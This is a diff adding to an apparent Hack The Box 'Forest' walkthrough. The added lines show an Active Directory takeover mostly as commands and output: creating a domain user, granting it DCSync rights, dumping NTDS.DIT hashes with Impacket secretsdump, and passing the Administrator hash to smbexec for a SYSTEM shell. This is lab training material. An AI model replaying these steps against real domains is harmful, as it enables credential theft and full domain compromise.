@@ -135,5 +135,32 @@ Data: 1027036 bytes of 1027036 bytes copied
 Info: Upload successful!
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net user joe jerryPass /add /domain
+The command completed successfully.
+Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
+And login again as svc-alfresco for the changes to take effect.
+HTB\Exchange Trusted Subsystem             Group            S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity joe -Rights DCSync
+
+---------------------
+└─# python secretsdump.py -just-dc 'htb/joe:jerryPass@10.10.10.161'
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+-------------------------
+└─# python smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' 'htb/administrator@10.10.10.161'
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>type \users\administrator\desktop\root.txt
+f048153f202bbb2f82622b04d79129cc
+
+Further reference:
 https://hackso.me/forest-htb-walkthrough/
